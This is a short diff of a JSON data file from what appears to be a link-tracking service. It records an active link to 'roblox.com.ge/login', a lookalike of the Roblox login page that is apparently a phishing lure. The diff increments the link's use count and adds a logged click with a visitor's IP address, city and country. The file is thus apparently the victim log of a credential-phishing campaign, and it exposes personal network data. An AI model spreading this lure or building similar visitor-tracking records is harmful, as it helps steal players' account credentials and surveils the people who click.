@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1543,
+    "useCount": 1544,
     "createdBy": "admin",
     "clicks": [
       {
@@ -12510,6 +12510,14 @@
         "ip": "112.205.95.159",
         "country": "Philippines",
         "city": "Pasig",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777449519067,
+        "ip": "103.65.116.143",
+        "country": "Philippines",
+        "city": "Manolo Fortich",
         "flag": "🇵🇭",
         "countryCode": "PH"
       }
